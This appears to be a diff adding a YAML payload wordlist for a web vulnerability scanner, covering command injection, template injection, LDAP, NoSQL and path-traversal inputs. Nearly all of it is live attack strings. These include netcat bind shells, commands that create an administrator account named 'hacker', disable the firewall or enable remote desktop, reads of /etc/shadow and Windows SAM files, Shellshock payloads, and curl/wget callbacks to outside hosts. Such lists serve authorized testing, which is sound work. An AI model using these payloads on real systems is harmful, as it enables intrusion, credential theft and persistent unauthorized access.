XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+- eval('ls')
+- eval('pwd')
+- eval('pwd');
+- eval('sleep 5')
+- eval('sleep 5');
+- eval('whoami')
+- eval('whoami');
+- exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+- exec('ls')
+- exec('pwd')
+- exec('pwd');
+- exec('sleep 5')
+- exec('sleep 5');
+- exec('whoami')
+- exec('whoami');
+- ;{$_GET["cmd"]}
+- '`id`'
+- '|id'
+- '| id'
+- ;id
+- ;id|
+- ;id;
+- '& id'
+- '&&id'
+- ;id\n
+- ifconfig
+- '| ifconfig'
+- ; ifconfig
+- '& ifconfig'
+- '&& ifconfig'
+- /index.html|id|
+- ipconfig
+- '| ipconfig /all'
+- ; ipconfig /all
+- '& ipconfig /all'
+- '&& ipconfig /all'
+- ipconfig /all
+- ls
+- $(`ls`)
+- '| ls -l /'
+- ; ls -l /
+- '& ls -l /'
+- '&& ls -l /'
+- ls -l /
+- '| ls -laR /etc'
+- ; ls -laR /etc
+- '& ls -laR /etc'
+- '&& ls -laR /etc'
+- '| ls -laR /var/www'
+- ; ls -laR /var/www
+- '& ls -laR /var/www'
+- '&& ls -laR /var/www'
+- '| ls -l /etc/'
+- ; ls -l /etc/
+- '& ls -l /etc/'
+- '&& ls -l /etc/'
+- ls -l /etc/
+- ls -lh /etc/
+- '| ls -l /home/*'
+- ; ls -l /home/*
+- '& ls -l /home/*'
+- '&& ls -l /home/*'
+- ls -l /home/*
+- '*; ls -lhtR /var/www/'
+- '| ls -l /tmp'
+- ; ls -l /tmp
+- '& ls -l /tmp'
+- '&& ls -l /tmp'
+- ls -l /tmp
+- '| ls -l /var/www/*'
+- ; ls -l /var/www/*
+- '& ls -l /var/www/*'
+- '&& ls -l /var/www/*'
+- ls -l /var/www/*
+- <!--#exec cmd="/bin/cat /etc/passwd"-->
+- <!--#exec cmd="/bin/cat /etc/shadow"-->
+- <!--#exec cmd="/usr/bin/id;-->
+- \n
+- \n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`
+- \n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`
+- \n/bin/ls -al\n
+- '| nc -lvvp 4444 -e /bin/sh|'
+- ; nc -lvvp 4444 -e /bin/sh;
+- '& nc -lvvp 4444 -e /bin/sh&'
+- '&& nc -lvvp 4444 -e /bin/sh &'
+- nc -lvvp 4444 -e /bin/sh
+- nc -lvvp 4445 -e /bin/sh &
+- nc -lvvp 4446 -e /bin/sh|
+- nc -lvvp 4447 -e /bin/sh;
+- nc -lvvp 4448 -e /bin/sh&
+- \necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n
+- \necho INJECTX\nexit\n\033[2Asleep 5\n
+- \necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n
+- '| net localgroup Administrators hacker /ADD'
+- ; net localgroup Administrators hacker /ADD
+- '& net localgroup Administrators hacker /ADD'
+- '&& net localgroup Administrators hacker /ADD'
+- net localgroup Administrators hacker /ADD
+- '| netsh firewall set opmode disable'
+- ; netsh firewall set opmode disable
+- '& netsh firewall set opmode disable'
+- '&& netsh firewall set opmode disable'
+- netsh firewall set opmode disable
+- netstat
+- ;netstat -a;
+- '| netstat -an'
+- ; netstat -an
+- '& netstat -an'
+- '&& netstat -an'
+- netstat -an
+- '| net user hacker Password1 /ADD'
+- ; net user hacker Password1 /ADD
+- '& net user hacker Password1 /ADD'
+- '&& net user hacker Password1 /ADD'
+- net user hacker Password1 /ADD
+- '| net view'
+- ; net view
+- '& net view'
+- '&& net view'
+- net view
+- \nid|
+- \nid;
+- \nid\n
+- \n/usr/bin/id\n
+- perl -e 'print "X"x1024'
+- '|| perl -e ''print "X"x16096'''
+- '| perl -e ''print "X"x16096'''
+- ; perl -e 'print "X"x16096'
+- '& perl -e ''print "X"x16096'''
+- '&& perl -e ''print "X"x16096'''
+- perl -e 'print "X"x16384'
+- ; perl -e 'print "X"x2048'
+- '& perl -e ''print "X"x2048'''
+- '&& perl -e ''print "X"x2048'''
+- perl -e 'print "X"x2048'
+- '|| perl -e ''print "X"x4096'''
+- '| perl -e ''print "X"x4096'''
+- ; perl -e 'print "X"x4096'
+- '& perl -e ''print "X"x4096'''
+- '&& perl -e ''print "X"x4096'''
+- perl -e 'print "X"x4096'
+- '|| perl -e ''print "X"x8096'''
+- '| perl -e ''print "X"x8096'''
+- ; perl -e 'print "X"x8096'
+- '&& perl -e ''print "X"x8096'''
+- perl -e 'print "X"x8192'
+- perl -e 'print "X"x81920'
+- '|| phpinfo()'
+- '| phpinfo()'
+- '{${phpinfo()}}'
+- ;phpinfo()
+- ;phpinfo();//
+- ''';phpinfo();//'
+- '& phpinfo()'
+- '&& phpinfo()'
+- phpinfo()
+- phpinfo();
+- <?php system("cat /etc/passwd");?>
+- <?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
+- <?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj");?>
+- <?php system("echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");?>
+- <?php system("sleep 10");?>
+- <?php system("sleep 5");?>
+- <?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
+- <?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc");?>
+- :phpversion();
+- '`ping 127.0.0.1`'
+- '& ping -i 30 127.0.0.1 &'
+- '& ping -n 30 127.0.0.1 &'
+- ;${@print(md5(RCEVulnerable))};
+- ${@print("RCEVulnerable")}
+- ${@print(system($_SERVER['HTTP_USER_AGENT']))}
+- pwd
+- '| pwd'
+- ; pwd
+- '& pwd'
+- '&& pwd'
+- \r
+- '| reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
+  /t REG_DWORD /d 0 /f'
+- ; reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
+  /t REG_DWORD /d 0 /f
+- '& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
+  /t REG_DWORD /d 0 /f'
+- '&& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
+  /t REG_DWORD /d 0 /f'
+- reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
+  /t REG_DWORD /d 0 /f
+- \r\n
+- route
+- '| sleep 1'
+- ; sleep 1
+- '& sleep 1'
+- '&& sleep 1'
+- sleep 1
+- '|| sleep 10'
+- '| sleep 10'
+- ; sleep 10
+- '{${sleep(10)}}'
+- '& sleep 10'
+- '&& sleep 10'
+- sleep 10
+- '|| sleep 15'
+- '| sleep 15'
+- ; sleep 15
+- '& sleep 15'
+- '&& sleep 15'
+- '{${sleep(20)}}'
+- '{${sleep(3)}}'
+- '| sleep 5'
+- ; sleep 5
+- '& sleep 5'
+- '&& sleep 5'
+- sleep 5
+- '{${sleep(hexdec(dechex(20)))}}'
+- sysinfo
+- '| sysinfo'
+- ; sysinfo
+- '& sysinfo'
+- '&& sysinfo'
+- ;system('cat%20/etc/passwd')
+- system('cat C:\boot.ini');
+- system('cat config.php');
+- system('cat /etc/passwd');
+- '|| system(''curl https://crowdshield.com/.testing/rce_vuln.txt'');'
+- '| system(''curl https://crowdshield.com/.testing/rce_vuln.txt'');'
+- ; system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+- '& system(''curl https://crowdshield.com/.testing/rce_vuln.txt'');'
+- '&& system(''curl https://crowdshield.com/.testing/rce_vuln.txt'');'
+- system('curl https://crowdshield.com/.testing/rce_vuln.txt')
+- system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf')
+- system('curl https://xerosecurity.com/.testing/rce_vuln.txt');
+- system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+- systeminfo
+- '| systeminfo'
+- ; systeminfo
+- '& systeminfo'
+- '&& systeminfo'
+- system('ls')
+- system('pwd')
+- system('pwd');
+- '|| system(''sleep 5'');'
+- '| system(''sleep 5'');'
+- ; system('sleep 5');
+- '& system(''sleep 5'');'
+- '&& system(''sleep 5'');'
+- system('sleep 5')
+- system('sleep 5');
+- system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23')
+- system('wget https://xerosecurity.com/.testing/rce_vuln.txt');
+- system('whoami')
+- system('whoami');
+- test*; ls -lhtR /var/www/
+- test* || perl -e 'print "X"x16096'
+- test* | perl -e 'print "X"x16096'
+- test* & perl -e 'print "X"x16096'
+- test* && perl -e 'print "X"x16096'
+- test*; perl -e 'print "X"x16096'
+- $(`type C:\boot.ini`)
+- '&&type C:\\boot.ini'
+- '| type C:\Windows\repair\SAM'
+- ; type C:\Windows\repair\SAM
+- '& type C:\Windows\repair\SAM'
+- '&& type C:\Windows\repair\SAM'
+- type C:\Windows\repair\SAM
+- '| type C:\Windows\repair\SYSTEM'
+- ; type C:\Windows\repair\SYSTEM
+- '& type C:\Windows\repair\SYSTEM'
+- '&& type C:\Windows\repair\SYSTEM'
+- type C:\Windows\repair\SYSTEM
+- '| type C:\WINNT\repair\SAM'
+- ; type C:\WINNT\repair\SAM
+- '& type C:\WINNT\repair\SAM'
+- '&& type C:\WINNT\repair\SAM'
+- type C:\WINNT\repair\SAM
+- type C:\WINNT\repair\SYSTEM
+- '| type %SYSTEMROOT%\repair\SAM'
+- ; type %SYSTEMROOT%\repair\SAM
+- '& type %SYSTEMROOT%\repair\SAM'
+- '&& type %SYSTEMROOT%\repair\SAM'
+- type %SYSTEMROOT%\repair\SAM
+- '| type %SYSTEMROOT%\repair\SYSTEM'
+- ; type %SYSTEMROOT%\repair\SYSTEM
+- '& type %SYSTEMROOT%\repair\SYSTEM'
+- '&& type %SYSTEMROOT%\repair\SYSTEM'
+- type %SYSTEMROOT%\repair\SYSTEM
+- uname
+- ;uname;
+- '| uname -a'
+- ; uname -a
+- '& uname -a'
+- '&& uname -a'
+- uname -a
+- '|/usr/bin/id'
+- ;|/usr/bin/id|
+- ;/usr/bin/id|
+- $;/usr/bin/id
+- '() { :;};/usr/bin/perl -e ''print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget
+  http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\");'''
+- () { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11
+- '| wget http://crowdshield.com/.testing/rce.txt'
+- '& wget http://crowdshield.com/.testing/rce.txt'
+- ; wget https://crowdshield.com/.testing/rce_vuln.txt
+- $(`wget https://crowdshield.com/.testing/rce_vuln.txt`)
+- '&& wget https://crowdshield.com/.testing/rce_vuln.txt'
+- wget https://crowdshield.com/.testing/rce_vuln.txt
+- $(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+- which curl
+- which gcc
+- which nc
+- which netcat
+- which perl
+- which python
+- which wget
+- whoami
+- '| whoami'
+- ; whoami
+- ''' whoami'
+- ''' || whoami'
+- ''' & whoami'
+- ''' && whoami'
+- '''; whoami'
+- '" whoami'
+- '" || whoami'
+- '" | whoami'
+- '" & whoami'
+- '" && whoami'
+- '"; whoami'
+- $(`whoami`)
+- '& whoami'
+- '&& whoami'
+- '{{ get_user_file("C:\boot.ini") }}'
+- '{{ get_user_file("/etc/hosts") }}'
+- '{{ get_user_file("/etc/passwd") }}'
+- '{{4+4}}'
+- '{{4+8}}'
+- '{{person.secret}}'
+- '{{person.name}}'
+- '{1} + {1}'
+- '{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}'
+- '{{[] .__ Class __.__ base __.__ subclasses __ ()}}'
+- '&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;'
+- '&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;'
+- '&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;'
+- '";id;"'
+- ''';id;'''
+- '"|id|"'
+- '''|id|'''
+- '|id|'
+- '"|/usr/bin/id|"'
+- '''|/usr/bin/id|'''
+- '|/usr/bin/id|'
+- '"||/usr/bin/id|"'
+- '''||/usr/bin/id|'''
+- '||/usr/bin/id|'
+- '|id;'
+- '||/usr/bin/id;'
+- '"\n/bin/ls -al\n"'
+- '''\n/bin/ls -al\n'''
+- \n/usr/bin/id;
+- \n/usr/bin/id|
+- ;/usr/bin/id\n
+- '|usr/bin/id\n'
+- '|nid\n'
+- '`/usr/bin/id`'
+- a);id
+- a;id
+- a);id;
+- a);id|
+- a)|id
+- a|id
+- a)|id;
+- '|/bin/ls -al'
+- a);/usr/bin/id
+- a;/usr/bin/id
+- a);/usr/bin/id;
+- a;/usr/bin/id;
+- a);/usr/bin/id|
+- a;/usr/bin/id|
+- a)|/usr/bin/id
+- a|/usr/bin/id
+- a)|/usr/bin/id;
+- ;system('id')
+- ;system('/usr/bin/id')
+- '%22%0A/usr/bin/id%0A%22'
+- '%27%0A/usr/bin/id%0A%27'
+- '"& ping -i 30 127.0.0.1 &"'
+- '''& ping -i 30 127.0.0.1 &'''
+- ; id
+ssti:
+- 42*42
+- '{42*42}'
+- '{{42*42}}'
+- '{{{42*42}}}'
+- '#{42*42}'
+- ${42*42}
+- <%=42*42 %>
+- '{{=42*42}}'
+- '{^xyzm42}1764{/xyzm42}'
+- ${donotexists|42*42}
+- '[[${42*42}]]'
+- '#'
+- 1/0
+- .version
+- .current_template_name
+- .locale_object
+- self._TemplateReference__context
+- settings
+- settings.DEBUG
+- settings.DATABASES
+- settings.SECRET_KEY
+- self
+- locals
+- global
+- ERB.version()
+- locals()
+- globals()
+- _self
+- _self.getTemplateName().__toString
+- _context
+- _context|length
+- _context|keys|first
+- constant('Twig_Environment::VERSION')
+- constant('Twig_Environment::VERSION_ID')
+- constant('Twig_Environment::EXTRA_VERSION')
+- $context.keys
+- $context.TOOLS_VERSION
+- $field.in("org.apache.velocity.runtime.VelocityEngineVersion")
+- $field.in("org.apache.velocity.runtime.RuntimeConstants")
+- '#execInfo'
+- '#execInfo.templateStack'
+- '#execInfo.templateStack[0].getClass.forName("org.thymeleaf.Thymeleaf").getField("VERSION").get(null)'
+- execInfo
+- execInfo.templateStack
+- execInfo.templateStack[0].getClass.forName("org.thymeleaf.Thymeleaf").getField("VERSION").get(null)
+- $smarty.version
+- $smarty.config
+- $smarty.template
+ldap:
+- '*'
+- '*)(&'
+- '*))%00'
+- '*()|%26'''
+- '*()|&'''
+- '*(|(mail=*))'
+- '*(|(objectclass=*))'
+- '*)(uid=*))(|(uid=*'
+- '*/*'
+- '*|'
+- /
+- //
+- //*
+- '@*'
+- '|'
+- admin*
+- admin*)((|userpassword=*)
+- admin*)((|userPassword=*)
+- x' or name()='username' or 'x'='y
+- '!'
+- '%21'
+- '%26'
+- '%28'
+- '%29'
+- '%2A%28%7C%28mail%3D%2A%29%29'
+- '%2A%28%7C%28objectclass%3D%2A%29%29'
+- '%2A%7C'
+- '%7C'
+- '&'
+- (
+- )
+- )(cn=))\x00
+nosql:
+- 'true, $where: ''1 == 1'''
+- ', $where: ''1 == 1'''
+- '$where: ''1 == 1'''
+- ''', $where: ''1 == 1'''
+- '1, $where: ''1 == 1'''
+- '{ $ne: 1 }'
+- ''', $or: [ {}, { ''a'':''a'
+- ''' } ], $comment:''successful MongoDB injection'''
+- db.injection.insert({success:1});
+- db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+- '|| 1==1'
+- ''' && this.password.match(/.*/)//+%00'
+- ''' && this.passwordzz.match(/.*/)//+%00'
+- '''%20%26%26%20this.password.match(/.*/)//+%00'
+- '''%20%26%26%20this.passwordzz.match(/.*/)//+%00'
+- '{$gt: ''''}'
+- '{"$gt": ""}'
+- '[$ne]=1'
+- ''';sleep(5000);'
+- ''';sleep(5000);'''
+- ''';sleep(5000);+'''
+- ''';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);'
+- ''';return ''a''==''a'' && ''''=='''
+- '";return(true);var xyz=''a'
+- 0;return true
+- '{"&exists":false}'
+path_traversal:
+- \..\WINDOWS\win.ini
+- \..\..\WINDOWS\win.ini
+- \..\..\..\WINDOWS\win.ini
+- \..\..\..\..\WINDOWS\win.ini
+- \..\..\..\..\..\WINDOWS\win.ini
+- \..\..\..\..\..\..\WINDOWS\win.ini
+- '%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69'
+- '%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69'
+- '%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69'
+- '%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69'
+- '%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69'
+- '%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69'
+- '%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69'
+- '%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39'
+- '%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39'
+- '%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39'
+- '%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39'
+- ..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
+- ..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
+- ..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
+- ..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
+- ..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
+- ..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
+- ..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
+- '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c'
